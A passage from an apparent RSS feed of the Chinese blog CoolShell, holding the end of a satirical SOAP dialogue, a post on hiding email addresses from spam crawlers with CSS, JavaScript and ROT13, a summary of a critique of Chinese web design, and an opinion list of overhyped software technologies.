<p><strong>SOAP专家</strong>: 哦，没有规格说明书。这只是Microsoft自己搞的。不过应该是个很不错的主意，挺不错的。然后，这是一个新玩意。我想你一定会喜欢它的—— Web Services Interoperability Group，简称 WS-I，它就是为了移除 SOAP 和 WSDL 规格说明书中的那些歧义。我知道你有多么喜欢规格说明书。</p>
<p><strong>程序员</strong>: 所以，换句话说，原来的那些规格说明书太糟糕了，以致于你需要一个标准化的东西来标准化这些标准。上帝啊。好吧，那么，是否这些协调问题被 解决了？</p>
<p><strong>SOAP专家</strong>: 当然，只要你使用 WS-I 的 SOAP 栈，就可以减少使用80%的 XML Schema，别用任何不同寻常的数据类型，也别期望可以和WebSphere和 Apache Axis一起运行。</p>
<p><strong>程序员</strong>: 那么，是否包装的文件被在那里被解释了？</p>
<p><strong>SOAP专家</strong>: 没有，但是你的工具会明白的。绝大多数，总之。</p>
<p><strong>程序员</strong>: 让我总结一下，SOAP的定义是不变的，SOAP可以是任何东西，但就是简单，它不再意味着对象访问，就算是所有的工具都那样做。</p>
<p><strong>SOAP专家</strong>: 基本上是对的，但是我们走得比你要远一些。我们不赞成SOAP缩写的含义。</p>
<p><strong>程序员</strong>: 真的！那么SOAP是什么的缩写？</p>
<p><strong>SOAP专家</strong>: 什么也不是，就是SOAP.</p>
<p><strong>程序员</strong>: (无语中……)</p>
<p><strong>SOAP专家</strong>: 下面让我来告诉你什么是 UDDI。</p>
<p>（注：我以前还认真地学过SOAP，不过真是学不懂。）</p>
<p>原文：<a href="http://harmful.cat-v.org/software/xml/soap/simple" target="_blank">来源</a></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/3609.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3609.html" class="wp_rp_title">那些炒作过度的技术和概念</a>
</li>
<li>
<a href="https://coolshell.cn/articles/9508.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/9508.html" class="wp_rp_title">PFIF网上寻人协议</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4905.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4905.html" class="wp_rp_title">语言的数据亲和力</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3684.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3684.html" class="wp_rp_title">Web开发人员速查卡</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3498.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3498.html" class="wp_rp_title">信XML，得自信</a>
</li>
<li>
<a href="https://coolshell.cn/articles/2504.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2504.html" class="wp_rp_title">信XML，得永生！</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3585" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="9685f99dcd">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>9</strong> 人打了分，平均分： <strong>3.89</strong> )<br><span class="post-ratings-text" id="ratings_3585_text"></span><meta itemprop="name" content="SOAP的S是Simple">
<meta itemprop="headline" content="SOAP的S是Simple">
<meta itemprop="description" content="曾经有一个争论，一边是站在SOAP这边的人，另一边则是其它人。 站在SOAP这边人，当他们在争论SOAP和Web Service框架的复杂度时，SOAP这边的人说，在引入那些WS-*东东之前，SOAP的确是简单的，这就是为什么SOAP的第一个字母S就是Simple。

在2000年的时候，有一个苦恼的程序员，

程序员: 不好意思，我的老板这周末去打高尔夫了，现在我不得不要搞一个SOAP的...">
<meta itemprop="datePublished" content="2011-01-27T08:47:56+08:00">
<meta itemprop="dateModified" content="2011-01-24T23:49:21+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3585.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3585.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.89">
<meta itemprop="ratingCount" content="9">
</div>
</div>
<div id="post-ratings-3585-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-01-27T08:47:56+08:00</pubDate>
<guid>https://coolshell.cn/articles/3585.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 如何“加密”你的email地址 ]]></title>
<link>https://coolshell.cn/articles/3595.html</link>
<content><![CDATA[ 
<p>现在在网上要小心，无论是<a href="https://coolshell.cn/articles/2428.html" target="_blank">保护好你的用户名和帐号</a>，还是我们的电子邮件地址。在网上有很多爬虫程序专爬我们的电子邮件地址，一量被爬中了，那么你的邮箱里就是一堆又一堆的垃圾邮件，就好像我的haoel(at)hotmail.com一样，在7、8年前，每天几千封的垃圾邮件。现在hotmail的垃圾邮件过滤得好一些了，不过也有每天40封左右的垃圾邮件。但是我们在自己的网页上又需要发布自己的email地址。所以我们需要搞乱我们的邮件地址，就像那种非常规的<a href="https://coolshell.cn/articles/933.html" target="_blank">搞乱代码一样</a>。不过，我们还需要能认人读的出来。</p>
<p>一般来说，在网上现在很普遍的做法是——</p>
<ul>
<li>1）用图片，可以用PHP动态生成那个验证码式的。</li>
<li>2）把@变成at，把点变成dot，如 haoel(at)hotmail(dot)com之类的。</li>
<li>3）把a变成@，写成<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="395158565c557951564d54">[email protected]</a>@mail.com</li>
</ul>
<p>不过这些还是能被爬到，用图片的方法不利于用户拷贝粘贴。下面介绍几种方法：</p>
<h4>第一种：使用CSS样式</h4>
<p><strong>反转字序</strong></p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">span.codedirection { unicode-bidi:bidi-override; direction: rtl; }
&lt;p&gt;&lt;span&gt;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="600d0f034e0c09010d140f08200c050f0108">[email protected]</a>&lt;/span&gt;&lt;/p&gt;</pre>
<p><span id="more-3595"></span></p>
<p><strong>加入些不显示的字符串</strong></p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">p span.hide { display:none; }
&lt;p&gt;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="cfa9a0a08fadaebd">[email protected]</a>&lt;span class="hide"&gt;null&lt;/span&gt;.baz&lt;/p&gt;</pre>
<h4>第二种：使用Javascript</h4>
<p>最为简单的方法是：</p>
<p>[javascript]document.write("haoel" + "@" + "hotmail" + "." + "com");[/javascript]</p>
<p>或是：</p>
<p>[javascript]&lt;script type="text/javascript"&gt;<br>
&lt;!–<br>
var string1 = "@";<br>
var string2 = "haoel";<br>
var string3 = "hotmail.com";<br>
var string4 = string2 + string1 + string3;<br>
document.write("&lt;a href=" + "mail" + "to:" + string2 + string1 + string3 + "&gt;" + string4 + "&lt;/a&gt;");<br>
//–&gt;<br>
&lt;/script&gt;[/javascript]</p>
<p>不过更为强大的是使用ROT13加密，这里有一个<a href="http://rot13.de/" target="_blank">ROT13的在线工具</a>，或是使用PHP的ROT13的函数<a href="http://ch2.php.net/str_rot13" target="_blank">str_rot13</a>。</p>
<p>[javascript]&lt;script type=”text/javascript”&gt;<br>
document.write(“&lt;n uers=\"znvygb:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="06736864747f467364617c68707f2876647c">[email protected]</a>\"&gt;”.replace(/[a-zA-Z]/g,<br>
function(c){return String.fromCharCode((c&lt;=”Z”?90:122)&gt;=(c=c.charCodeAt(0)+13)?c:c-26);}));<br>
&lt;/script&gt;陈皓的电子邮件&lt;/a&gt;[/javascript]</p>
<p>这些方法还是很有效果的。</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/6193.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/6193.html" class="wp_rp_title">CSDN明文口令泄露的启示</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5353.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5353.html" class="wp_rp_title">你会做Web上的用户登录功能吗？</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3877.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3877.html" class="wp_rp_title">另类UX让你输入强口令</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3801.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3801.html" class="wp_rp_title">破解你的口令</a>
</li>
<li>
<a href="https://coolshell.cn/articles/2451.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2451.html" class="wp_rp_title">Twitter的禁用口令</a>
</li>
<li>
<a href="https://coolshell.cn/articles/2428.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2428.html" class="wp_rp_title">如何管理并设计你的口令</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3595" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="24e7349fb4">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>6</strong> 人打了分，平均分： <strong>3.00</strong> )<br><span class="post-ratings-text" id="ratings_3595_text"></span><meta itemprop="name" content="如何“加密”你的email地址">
<meta itemprop="headline" content="如何“加密”你的email地址">
<meta itemprop="description" content="现在在网上要小心，无论是保护好你的用户名和帐号，还是我们的电子邮件地址。在网上有很多爬虫程序专爬我们的电子邮件地址，一量被爬中了，那么你的邮箱里就是一堆又一堆的垃圾邮件，就好像我的haoel(at)hotmail.com一样，在7、8年前，每天几千封的垃圾邮件。现在hotmail的垃圾邮件过滤得好一些了，不过也有每天40封左右的垃圾邮件。但是我们在自己的网页上又需要发布自己的email地址。所以我...">
<meta itemprop="datePublished" content="2011-01-27T13:03:06+08:00">
<meta itemprop="dateModified" content="2011-12-21T23:16:41+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3595.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3595.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3">
<meta itemprop="ratingCount" content="6">
</div>
</div>
<div id="post-ratings-3595-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-01-27T13:03:06+08:00</pubDate>
<guid>https://coolshell.cn/articles/3595.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 为什么中国的网页设计那么烂？ ]]></title>
<link>https://coolshell.cn/articles/3605.html</link>
<content><![CDATA[ 
<p><a href="http://thinkvitamin.com/author/nickjohnson/" target="_blank">Nick Johnson</a>，一个有12年经验的Web设计师在它的blog里写下了“<a href="http://thinkvitamin.com/design/why-is-chinese-web-design-so-bad/" target="_blank">Why is Chinese Web Design So Bad</a>”，新浪，人人，百度，阿里巴巴，腾讯榜上有名。<strong>其中的观点相当的好，希望所有的中国人都读一下。</strong>我不全文翻译了，只是给大家看一些摘要。（保证不会像《环球时报》一样）</p>
<p>——————————</p>
<p>作者2005年的夏天来到中国，他说，他注意到了中国那复杂的文化和西方的有多么的不同。比如，语言，身体特征，政府的执政理念，等等，但是，有一些地方确是差别很少的，比如：幽默的sense，还有对艺术的表现形式的兴趣。很快，因为职业，他发现在中国的网站设计上完全没有引吸到他。于是他开始让身边的中国朋友尽可能多的给他推荐中国的网站，他觉得这个可以对他学习Web Design有帮助。</p>
<p>当他在评论起新浪，人人，百度，阿里巴巴，腾讯的时候，他说，百度和其它的不同，因为百度悍然地公开抄袭Google的Web Design（blatantly copied their design from Google），而人人则是很明显地抄袭facebook（clearly copied their design from Facebook）。而其它的多数的中国网站看上去有很多很多滑稽可笑的文本，一些网站在滥用图片，一些网站图片又不够。他感到很困扰，这样的网站都能被接受？这么多的东西，网民怎么可能看得过来啊？中国人怎么可能容忍这些。（注：他不知道我们中国人能承受的比这更多）</p>
<p><span id="more-3605"></span></p>
<p>他说，更夸张的是，中国的网站上会有很多的动画，弹窗，幻灯片，感觉中国的设计师不是在设计，是在实践，还是实践那些很坏的设计理念，而些东西都是西方的设计师努力努力避免的。作者感到回到了1995年。</p>
<p>作者说，作为一个傲慢自大的西方人，他的第一反应是——“哦，这是一个发展中国家，简单来说，还不能赶上我们”，当然，这有可能，因为Web Design和艺术表现也有个发展过程的，当<strong>前的中国也许正处于“结构设计”时期</strong>。作者个人认为的另一个可能是，中国的Web设计者们培养环境的问题——<strong>中国的教育培养是说教和影响的方式，而不是持续的自然的艺术的进化</strong>。艺术进化的根是文化培养，但是更应该是自然的，自由地进化。</p>
<p>作者在说他为什么这么认为的原因时，提到了他花了些时间去了下中国的大学看看这些大学在教什么。他发现，<strong>中国的学生只是去记忆东西而不是真正的理解</strong>。<strong>他们从来不花时间去思考，而只是贪婪地去获取更多的信息</strong>。这和西方的教育完全的不同。（注：在这种教育体系下产生了像人人同抄袭和像新浪一样的满是信息的网页）作者继续说，在西方，他们一般用的都是“启发式”的东西，需要给人一种“啊，这样啊”的瞬间，这叫交互。而中国则不是，他们是先展示数据。中国的网站基本上是数据查询网站，就像把把信息注入到大脑中一样，没有过多的交互。</p>
<p>另一个中国的文化是——这个民族真是很不直接，不像美国，在中国如果有人一针见血的表达观点是很不舒服的事。和中国人谈话需要拐很多弯。然而，对于西方人来说，模糊的表达才是让人很不舒服的。但是中国人都很接受这样的沟通方式。这也是中国网页设计成这个样子的一个原因。</p>
<p>——————————————</p>
<p>我觉得作者的话说的很中肯。然而，作者的这篇博文后面很多回复，你都可以去看看。那些回复中，我看到的是那些“不服输”的中国人（这是不是我们从小那种“争第一”的教育培养出来人呢？）。</p>
<p>看完以后，我觉得让我思考的已经不是网页设计了，而是我们的教育和文化。</p>
<p><strong>你呢？是在反思呢，还是准备去作者的 blog上debate呢？</strong></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18094.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18094.html" class="wp_rp_title">如何免费的让网站启用HTTPS</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 – Qt官网的设计实践总结</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17737.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17737.html" class="wp_rp_title">AWS 的 S3 故障回顾和思考</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17680.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17680.html" class="wp_rp_title">从Gitlab误删除数据库想到的</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17459.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17459.html" class="wp_rp_title">关于高可用的系统</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3605" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="4ba882a466">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>42</strong> 人打了分，平均分： <strong>4.55</strong> )<br><span class="post-ratings-text" id="ratings_3605_text"></span><meta itemprop="name" content="为什么中国的网页设计那么烂？">
<meta itemprop="headline" content="为什么中国的网页设计那么烂？">
<meta itemprop="description" content="Nick Johnson，一个有12年经验的Web设计师在它的blog里写下了“Why is Chinese Web Design So Bad”，新浪，人人，百度，阿里巴巴，腾讯榜上有名。其中的观点相当的好，希望所有的中国人都读一下。我不全文翻译了，只是给大家看一些摘要。（保证不会像《环球时报》一样）

——————————

作者2005年的夏天来到中国，他说，他注意到了中国那复杂的文...">
<meta itemprop="datePublished" content="2011-01-28T08:47:14+08:00">
<meta itemprop="dateModified" content="2011-01-27T12:54:35+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3605.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3605.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.55">
<meta itemprop="ratingCount" content="42">
</div>
</div>
<div id="post-ratings-3605-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-01-28T08:47:14+08:00</pubDate>
<guid>https://coolshell.cn/articles/3605.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 那些炒作过度的技术和概念 ]]></title>
<link>https://coolshell.cn/articles/3609.html</link>
<content><![CDATA[ 
<p><a href="https://stackexchange.com" target="_blank">StackExchange.com</a>上有一个<a href="https://programmers.stackexchange.com/questions/38505/most-overhyped-software-engineering-technologies-and-concepts-of-the-last-20-year" target="_blank">贴子</a>在评论着最近20年来被炒作过度的技术，对于出现的结果，大多数赞同，也有一些不赞同。下面我从前15名挑了10个（Java的WORE我去掉了，TDD我也去掉了，因为我觉得他们应该没有炒作过度，而且都不错），按原贴的顺序罗列如下：（后面的一些评论是我加的，欢迎大家讨论）</p>
<h4>Top 10 过度炒作的技术和概念</h4>
<ul>
<li>
<strong>Unified Modeling Language (UML)</strong> – UML是一个程序员交流想法的不错的工具，但是他离程序员真正需要的设计工具还差得很远，比如：设计是否符合需求、架构设计、数据流等等。只有为数不多的程序员使用这个工具交流想法，而没有用在具体工作中。</li>
</ul>
<ul>
<li>
<strong>Sharepoint </strong>– 现在N多的公司都在用微软的这个东西做公司内部的Intranet。不过安装和维护起来，代价相当的大。但是其市场做的很成功，不对技术上来说对技术人员来说，相当的蹩脚。Sharepoint的设计没有认真地分析过业务流程，仅仅是一个文档存储地。看上去我们似乎可以做任何的事，但是如果你要用其来管理你的项目和track你的项目问题，你会发现其是无比的难用。</li>
</ul>
<ul>
<li>
<strong>eXtensible Mark-up Language (XML)</strong> –  XML嘛，以前说过很多了（<a href="https://coolshell.cn/articles/2504.html" target="_blank">XML1</a>，<a href="https://coolshell.cn/articles/3498.html" target="_blank"> XML2</a>）我们用他来做和程序数据封装，用来做配置文件，用来做网络传输格式。我们的程序处理起XML来，又慢，又不经济，没有工具，几乎无法维护XML文件。XML用来做数据封包真是很不经济，Yaml和JSON那个不比它简单？用XML来做程序配置文件不知道是谁想出来的主意，相当的愚蠢，看看Unix/Linux下的配置文件，简单易读，相当容易维护。真是高科技啊。</li>
</ul>
<ul>
<li>
<strong>SOAP, XML-RPC, WSDL 的 Web Services</strong> – 这个东西前几年炒的很凶。所有人都相信，这是程序员的未来。可惜的，其中的复杂和不一致，相当的令人恶心。<a href="https://coolshell.cn/articles/3585.html" target="_blank">SOAP的那个S居然还是Simple</a>！看来，扯上XML的都不会是什么好的东东。不过，个人认为，CORBA比他更恶。</li>
</ul>
<p><span id="more-3609"></span></p>
<ul>
<li>
<strong>CORBA </strong>– 作为一个比其更恶的更过度炒作的COM技术的Linux/Unix下的补充技术，这个技术也好不到哪里去。相当的复杂，从理论上开始就是这样了。这是一个没有经过实践就搞出来的一个东西。然后开始炒作。</li>
</ul>
<ul>
<li>
<strong>Cloud Computing</strong> – 这是一个靠炒作出现的东西。这个东西也就是说，我们可以使用不同的调备，比如电脑，平板电脑，手机，移动设备随时随地做想做的事。Google的Chrome笔记本的广告展示了这项技术，但是，把工作结果放在云端的人会有多少呢。更多的人更喜欢的是去使用那些自己可以控制的电脑或平台。Google在这点上做的明显不如Amazon，像Amazon EC2平台，你可以在世界上任何一个角落随时随地的去启动你那台远程的系统。（<strong><span style="color: #800000;"><em>更新（2011/1/29）</em></span></strong>：<span style="color: #808080;">解释一下，关于云计算，在写下这篇文章的时候我本来有点拿不定主意的，后来回顾了一下历史，如COM啊，ActiveX啊，EJB啊，当时感觉都是很强的东西，但是最终也只是被炒作的。云计算，我不知道未来怎么样，从今天来看，这项技术在今天存在炒作的情况——中移动云，阿里云，到处都是云，在云面前，神马都是浮云了。</span>）</li>
</ul>
<ul>
<li>
<strong>SOA – Service Oriented Architecture</strong> – 这是一个没有人真正知道是什么玩意的概念。炒作了很多年，很多人都试图去了解它，但最后的结果是打个哈欠，看别的东西去了。现在没有人提了。中国一些银行在IBM的鼓动下搞了很多所谓的SOA应用，结果是系统很复杂，当然，也再离不开IBM了。</li>
</ul>
<ul>
<li>
<strong>Software Industrial Process</strong> – 软件开发中有很多所谓的工业界的流程，用这些流程好像可以控制质量。外包公司和中国的本土公司很喜欢这些东西，比如ISO和CMMi，这些流程不能说不好，也有好的地方，尤其是对那些不会思考只要跟从的Worker来说。这些工业界流程中炒作过度的是，那些所谓的使用这些流程可以预测项目周期，质量控制，以前需求开发和管理等东西。其让流程上升到了一种神学的可预言的地步，同样也上升到了政治的地步。因为，这些流程中都必然会有SQA 的Audit的流程，还有统计和报告的流程，这些统统不是软件开发的流程，但是的确是相当的政治。使用这些工业届标准流程的公司，通常都是一些创造性有问题的公司。</li>
</ul>
<ul>
<li>
<strong>Agile Software Development – 敏捷开发</strong>。首先，我承认其中的很多实践相当有效，在理论上也不错，还有很多不错方法的。不过，还是有炒作的成分（<span style="color: #008000;"><strong>下面的言论，我等着被骂</strong></span>）对我来说，在中国，“敏捷开发”的炒作简直就像是一个电视购物，ThoughtWorks中国各种咨询师们软件开发经验其实并不丰富，准确来说，他们有的是咨询经验，而没有具体项目实施经验（有的咨询师甚至都没有写过一行代码就去学教人怎么编程和开发软件了），和他们沟通起来能够感到他们对敏捷很亢奋，而且是唯敏捷主义，就差打出Once Process，One Agile的口号了，他们信仰敏捷流程的已经接近宗教信仰，他们的精神世界很朝鲜。因为，无论你和他们的咨询师谈什么，他们只说敏捷，从来不会分析一下，项目的特性是什么？开发这个项目的人的风格是什么？客户的特性是什么？有没有关心软件的stakeholder们（如：程序员，测试人员，客户，管理人员）是怎么想的？而XP和SCRUM也就成了Push工程师最强大的工具。<strong><span style="color: #800000;">流程这个东西，应该是项目组自发出来的东西，而不是被 灌输，被教条使用的东西。不同的团队、不同的项目、不同的人，不同的风格就是不同的流程，只有去使用适合自己的流程才是最好的流程</span></strong>。<strong>打个比方，足球队中，巴西队玩的是个人艺术足球，德国队玩的是整体和纪律性足球，意大利玩的是防守型足球，但是他们都有夺世界杯冠军的实力，如果你硬要让巴西队去整德国队或是意大利队的风格，那就悲剧了</strong>。很显然，ThoughtWorks很像把全中国的软件公司都整成Agile的，这注定了其在中国是杯具的，也只能争取到那些不知所措的公司和项目，没有合适的项目，也只有靠各种炒作（比如整一些大会，搞一些宣传）。他们总是觉得中国的用户和程序员需要去用时间不停地教育，但是，他们从来没有想想自己的原因 — 靠教育和灌输是永远赢不了的。<strong>我给他们的个人建议是，不要以为世界就像你所想像的那样，学会尊重程序员和项目还有很多非技术的东西，多听听程序员和客户怎么说，多分析一下项目的特质，从实际情况出发，而不是自己涛涛不绝地<strong>向大家</strong>灌输自己的理论</strong>。</li>
</ul>
<ul>
<li>
<strong>Object-Oriented Programming (OOP</strong>) – 不多说了，以前本站说过了，所有的一切都在<a href="https://coolshell.cn/articles/3036.html" target="_blank">面向对象是个骗局</a>一文中。不过有一点我想告诉大家，面向对象的Design Pattern真是被滥用了，Design Pattern教你的是两件事，1）怎么去化繁为简，2）怎么能让对象的耦合性降低。而不是一个公式让你的套，但，更多的程序员则学会了“<a href="https://coolshell.cn/articles/2058.html" target="_blank">流行的设计模式编程</a>”。</li>
</ul>
<h4>附：下构面是我拿不定是否是过度炒作的技术</h4>
<p><strong>Write Once Run Anywhere </strong>– 这个有点让我不解，不知道为什么会那么靠前。这是Java的口号，我觉得Java在跨平台方面还是成功的，没有过度炒作啊。用虚拟机的确是做到了这一点，对于那些需要有不同的硬件和操作系统平台并不断升级和更换它们的公司来说，这的确是个很不错的解决平台依赖性的方案。我个感觉这个技术并没有炒作过头，至少在Java这边是这样的。与其说这个，还不如说EJB，这才是炒作过度的技术。</p>
<p>[<span style="color: #000080;">更新 2011/02/13</span>]下面的回复，在我形成这篇文章的时候我没有想过，经ming同学一说，我觉得似乎有些道理。</p>
<blockquote cite="#commentbody-29425">
<p><strong><a rel="nofollow" href="https://coolshell.cn/articles/3609.html/comment-page-1#comment-29425">ming</a> :</strong></p>
<p>我从一开始就觉得java的“Write Once Run Anywhere”是彻头彻尾的炒作。</p>
<p>想想，所谓的跨平台无非就是依靠虚拟机、解释器之类的东西实现的，那么，哪个脚本语言不是依靠解释器呢？古老的perl已经跨平台了。当然，跨平台的语言还有很多。但是，只有java炒作这个概念。</p>
</blockquote>
<p><strong>Test Driven Design (TDD)</strong> – 从测试案例开始写程序这可能是很多程序员都不习惯的方法。其实这是一种比较好的编程方法，保证了代码怎么改动都不会break其它没有改动的代码，代码可以在一种持续集成中保证质量。但是，我们需要知道TDD的一些副作用（在<a title="十条不错的编程观点 " href="https://coolshell.cn/articles/2424.html">十条不错的编程观点</a>里也提到过TDD的弊端）：1）TDD可能会让程序员敷衍了事，以为test case 没有错就正确了。2）TDD可能会让你忽略了软件设计和架构以及程序的扩展性和重用性。T<strong>DD只是一种方法，并不是程序的核心</strong>。当然，TDD近几年的炒作也有点过头，已经出现了“TDD是一种Design方法”等“神乎其技”的论调，我对此表示质疑中。</p>
<p>[更新 2011/02/13] 关于TDD，请参看我另一篇文章《<a rel="bookmark" href="https://coolshell.cn/articles/3649.html" target="_blank">TDD并不是看上去的那么美</a>》</p>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
